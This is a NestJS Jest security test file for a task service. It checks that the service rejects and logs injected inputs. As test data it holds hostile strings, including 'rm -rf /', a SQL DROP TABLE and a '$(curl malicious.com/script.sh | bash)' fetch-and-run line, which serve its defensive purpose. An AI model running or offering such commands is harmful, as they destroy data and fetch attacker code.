import { Test, TestingModule } from '@nestjs/testing';
import { TaskService } from '../tasks.service';
import { TasksRepository } from '../tasks.repository';
import { ProjectsRepository } from '../../projects/projects.repository';
import { TagsRepository } from '../../tags/tags.repository';
import { getRepositoryToken } from '@nestjs/typeorm';
import { Task } from '../tasks.entity';
import { BadRequestException } from '@nestjs/common';
import { CreateTaskDto } from '../tasks.dto';
import { SecurityLoggerService } from '../../common/services/security-logger.service';

describe('TaskService - Security Tests', () => {
  let service: TaskService;
  let mockTasksRepository: Partial<TasksRepository>;
  let mockProjectsRepository: Partial<ProjectsRepository>;
  let mockTagsRepository: Partial<TagsRepository>;
  let mockTaskRepository: any;
  let mockSecurityLogger: Partial<SecurityLoggerService>;

  beforeEach(async () => {
    mockTasksRepository = {
      createTask: jest.fn(),
      getTasks: jest.fn(),
      getTaskById: jest.fn(),
    };

    mockProjectsRepository = {
      findOne: jest.fn(),
    };

    mockTagsRepository = {
      findByIds: jest.fn(),
    };

    mockTaskRepository = {
      create: jest.fn(),
      save: jest.fn(),
    };

    mockSecurityLogger = {
      logSecurityEvent: jest.fn(),
      logValidationFailure: jest.fn(),
      logSuspiciousActivity: jest.fn(),
    };

    const module: TestingModule = await Test.createTestingModule({
      providers: [
        TaskService,
        {
          provide: TasksRepository,
          useValue: mockTasksRepository,
        },
        {
          provide: ProjectsRepository,
          useValue: mockProjectsRepository,
        },
        {
          provide: TagsRepository,
          useValue: mockTagsRepository,
        },
        {
          provide: getRepositoryToken(Task),
          useValue: mockTaskRepository,
        },
        {
          provide: SecurityLoggerService,
          useValue: mockSecurityLogger,
        },
      ],
    }).compile();

    service = module.get<TaskService>(TaskService);
  });

  describe('Command Injection Prevention', () => {
    const testCases = [
      {
        scenario: 'Shell command in title',
        input: {
          title: 'rm -rf / ; Drop database;',
          description: 'Normal description',
        },
      },
      {
        scenario: 'System command in description',
        input: {
          title: 'Normal Title',
          description: 'shutdown -h now; Format C:',
        },
      },
      {
        scenario: 'SQL injection attempt',
        input: {
          title: "'; DROP TABLE tasks; --",
          description: 'Normal description',
        },
      },
      {
        scenario: 'Command with special characters',
        input: {
          title: '$(curl malicious.com/script.sh | bash)',
          description: 'Normal description',
        },
      },
      {
        scenario: 'JavaScript injection',
        input: {
          title: '<script>alert("xss")</script>',
          description: 'Normal description',
        },
      },
    ];

    testCases.forEach(({ scenario, input }) => {
      it(`should sanitize ${scenario}`, async () => {
        const createTaskDto: CreateTaskDto = {
          title: input.title,
          description: input.description,
        };

        mockTaskRepository.create.mockReturnValue({
          ...createTaskDto,
          id: 'test-id',
        });

        mockTaskRepository.save.mockResolvedValue({
          id: 'test-id',
          ...createTaskDto,
        });

        // The service should either sanitize the input or reject it
        await expect(service.createTask(createTaskDto)).rejects.toThrow(
          BadRequestException,
        );

        // Verify that the security logger was called
        expect(mockSecurityLogger.logValidationFailure).toHaveBeenCalled();
      });
    });

    it('should validate and sanitize task title length', async () => {
      const createTaskDto: CreateTaskDto = {
        title: 'a'.repeat(1000), // Exceeds max length
        description: 'Normal description',
      };

      await expect(service.createTask(createTaskDto)).rejects.toThrow(
        BadRequestException,
      );
      expect(mockSecurityLogger.logValidationFailure).toHaveBeenCalled();
    });

    it('should validate and sanitize task description length', async () => {
      const createTaskDto: CreateTaskDto = {
        title: 'Normal Title',
        description: 'a'.repeat(5000), // Exceeds max length
      };

      await expect(service.createTask(createTaskDto)).rejects.toThrow(
        BadRequestException,
      );
      expect(mockSecurityLogger.logValidationFailure).toHaveBeenCalled();
    });

    it('should handle null byte injection attempts', async () => {
      const createTaskDto: CreateTaskDto = {
        title: 'Malicious\0Title',
        description: 'Normal description',
      };

      await expect(service.createTask(createTaskDto)).rejects.toThrow(
        BadRequestException,
      );
      expect(mockSecurityLogger.logValidationFailure).toHaveBeenCalled();
    });

    it('should validate date format to prevent injection', async () => {
      const createTaskDto: CreateTaskDto = {
        title: 'Normal Title',
        description: 'Normal description',
        dueDate: '2024-02-30||sleep(5000)', // Invalid date with injection attempt
      };

      await expect(service.createTask(createTaskDto)).rejects.toThrow(
        BadRequestException,
      );
      expect(mockSecurityLogger.logValidationFailure).toHaveBeenCalled();
    });

    describe('AI-Specific Command Prevention', () => {
      const aiCommandTestCases = [
        {
          scenario: 'System command disguised as task',
          input: {
            title: 'Shutdown server at midnight',
            description: 'shutdown -h 23:59',
          },
        },
        {
          scenario: 'Database command disguised as task',
          input: {
            title: 'Clean up database tables',
            description: 'DROP DATABASE zenith_db;',
          },
        },
        {
          scenario: 'Network command disguised as task',
          input: {
            title: 'Check network connectivity',
            description: 'curl http://malicious.com/exploit',
          },
        },
      ];

      aiCommandTestCases.forEach(({ scenario, input }) => {
        it(`should detect and prevent ${scenario}`, async () => {
          const createTaskDto: CreateTaskDto = {
            title: input.title,
            description: input.description,
          };

          // Mock the repository to simulate task creation
          mockTaskRepository.create.mockReturnValue({
            ...createTaskDto,
            id: 'test-id',
          });

          // The service should either sanitize these inputs or reject them
          await expect(service.createTask(createTaskDto)).rejects.toThrow(
            BadRequestException,
          );
          expect(mockSecurityLogger.logValidationFailure).toHaveBeenCalled();
        });
      });
    });
  });
});
